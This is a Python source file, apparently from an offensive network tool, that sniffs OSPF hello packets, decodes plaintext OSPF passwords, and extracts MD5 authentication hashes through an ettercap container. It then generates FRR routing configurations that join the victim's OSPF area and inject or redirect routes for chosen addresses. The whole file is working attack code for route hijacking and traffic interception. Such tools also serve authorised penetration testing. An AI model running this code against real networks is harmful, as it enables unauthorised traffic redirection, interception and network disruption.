from scapy.all import *
from scapy.contrib.ospf import OSPF_Hdr, OSPF_Hello, OSPF_LLS_Hdr, OSPF_DBDesc, OSPF_LSReq, OSPF_LSA_Hdr, \
    OSPF_LSReq_Item, OSPF_LSUpd, OSPF_Router_LSA, OSPF_Link, OSPF_LSAck

load_contrib('ospf')

from netaddr import IPAddress
from netaddr import IPNetwork

import sys
sys.path.append("..")

import protocol_parser
from state import user_var
import utility

import docker_wrapper

def detect_if_vulnerable(packet):
    if packet[OSPF_Hdr].type == 1 and packet[OSPF_Hdr].authtype == 0:
        #print("Unauthenticated OSPF Detected")
                #global headerdata

        #get_data_from_hello_packet 
        # returns -> 
        # - sourceMac       [0]
        # - sourceIP        [1]
        # - destinationMac  [2]
        # - destinationIP   [3]
        # - areaId          [4]
        # - helloInterval   [5]
        # - deadInterval    [6]
        # - router          [7]
        # - backup          [8]
        # - mask            [9]
        return True

    elif packet[OSPF_Hdr].type == 1 and packet[OSPF_Hdr].authtype == 1:
        return True

    elif packet[OSPF_Hdr].authtype == 2:

        # TODO put this somewhere more sensible

        wrpcap('/tmp/ospf_auth.pcap', packet)

        # wrpcap('{}/ospf_auth.pcap'.format(user_var.path), packet)

        docker_wrapper.run_ettercap_container_once()
        utility.extract_hashes_from_ettercap_output()
        return True
    else:
        return False

def get_data_from_ospf_header(packet):
    areaId = packet['OSPF Header'].area
    authtype = packet['OSPF Header'].authtype
    authdata = None

    if authtype == 1:
        authdata = hex(packet['OSPF Header'].authdata)[2:]
        authdata = bytes.fromhex(authdata)
        authdata = authdata.decode("ASCII").rstrip('\x00')

    return areaId, authtype, authdata

def get_packet_data(packet):
    sourceMac, sourceIP, destinationMac, destinationIP = protocol_parser.get_data_from_layer_two_and_three(packet)
    areaId, authtype, authdata = get_data_from_ospf_header(packet)
    helloInterval = packet['OSPF Hello'].hellointerval
    deadInterval = packet['OSPF Hello'].deadinterval
    router = packet['OSPF Hello'].router
    backup = packet['OSPF Hello'].backup
    mask = packet['OSPF Hello'].mask

    return sourceMac, sourceIP, destinationMac, destinationIP, areaId, helloInterval, deadInterval, router, backup, mask, authtype, authdata

def build_configurations(packet):

    ospfd_config = '!\n' + f'interface {user_var.interface}\n'
    ospfd_config += f' ip ospf hello-interval {packet.hello_interval}\n'
    ospfd_config += f' ip ospf dead-interval {packet.dead_interval}\n'

    if user_var.password:
        ospfd_config += ' ip ospf authentication message-digest\n'
        ospfd_config += f' ip ospf message-digest-key 1 md5 {user_var.password}\n'
    elif packet.authtype == 1:
        ospfd_config += f' ip ospf authentication-key {packet.authdata}\n'

    ospfd_config += '!\n'
    ospfd_config += 'router ospf\n'
    ospfd_config += f' network {utility.get_ip_address_from_interface(user_var.interface)}/32 area {packet.area_id}\n'


    if user_var.inject_local or user_var.redirect_local:
        ospfd_config += f' network 172.17.0.0/16 area {packet.area_id}\n'


    if user_var.password:
        ospfd_config += f' area {packet.area_id} authentication message-digest\n'
    elif packet.authtype == 1:
        ospfd_config += f' area {packet.area_id} authentication\n'

    staticd_config = ''
    pbrd_config = ''

    if user_var.inject or user_var.redirect:

        count = 0

        ospfd_config += ' redistribute static metric 0\n'
        staticd_config += '!\n'
        pbrd_config += '!\n'
        pbrd_config += f'interface {user_var.interface}\n'
        pbrd_config += ' pbr-policy PBRMAP\n'

        for ip in user_var.ipaddress:
            # FIXME look into ensuring CIDR is in there.
            staticd_config += f'ip route {ip} Null0\n'

            count += 1
            pbrd_config += '!\n'
            pbrd_config += f'pbr-map PBRMAP seq {count}\n'
            pbrd_config += f' match dst-ip {ip}\n'
            pbrd_config += f' set nexthop {utility.get_default_gateway()}\n'

        for ip in user_var.redirectaddresses:
            # FIXME look into ensuring CIDR is in there.
            staticd_config += f'ip route {ip} Null0\n'

            count += 1
            pbrd_config += '!\n'
            pbrd_config += f'pbr-map PBRMAP seq {count}\n'
            pbrd_config += f' match dst-ip {ip}\n'
            pbrd_config += f' set nexthop {utility.get_default_gateway()}\n'

    ospfd_config += '!\n'
    staticd_config += '!\n'
    pbrd_config += '!\n'

    return ospfd_config, staticd_config, pbrd_config

def build_peer_zebra_configuration():
    zebrad_config = ''

    if user_var.inject_local or user_var.redirect_local:

        zebrad_config += '!\n'

        count = 0

        counts = []

        for ip in user_var.inject_local_ip_addresses:
            count += 1
            zebrad_config += f'access-list {count}0 seq 1 permit {ip}\n'
            counts.append(count)

        for ip in user_var.redirect_local_ip_addresses:
            count += 1
            zebrad_config += f'access-list {count}0 seq 1 permit {ip}\n'
            counts.append(count)

        zebrad_config += f'access-list {count + 1}0 seq 1 permit any\n'
        zebrad_config += '!\n'
        zebrad_config += 'route-map rmap deny 1\n'

        for c in counts:
            zebrad_config += f' match ip address {c}0\n'
        zebrad_config += '!\n'
        zebrad_config += 'route-map rmap permit 2\n'
        zebrad_config += f' match ip address {count + 1}0\n'
        zebrad_config += '!\n'
        zebrad_config += 'ip protocol ospf route-map rmap\n'

    zebrad_config += '!\n'
    return zebrad_config

def build_peer_configuration(packet):

    ospfd_config = '!\n' + 'interface eth0\n'
    ospfd_config += f' ip ospf hello-interval {packet.hello_interval}\n'
    ospfd_config += f' ip ospf dead-interval {packet.dead_interval}\n'
    ospfd_config += '!\n'
    ospfd_config += 'router ospf\n'
    ospfd_config += f' network 0.0.0.0/0 area {packet.area_id}\n'

    staticd_config = ''

    if user_var.inject_local or user_var.redirect_local:

        ospfd_config += ' redistribute static metric 0\n'

        staticd_config += '!\n'

        for ip in user_var.inject_local_ip_addresses:
            staticd_config += f'ip route {ip} Null0\n'

        for ip in user_var.redirect_local_ip_addresses:
            staticd_config += f'ip route {ip} Null0\n'

    ospfd_config += '!\n'
    staticd_config += '!\n'


    return ospfd_config, staticd_config
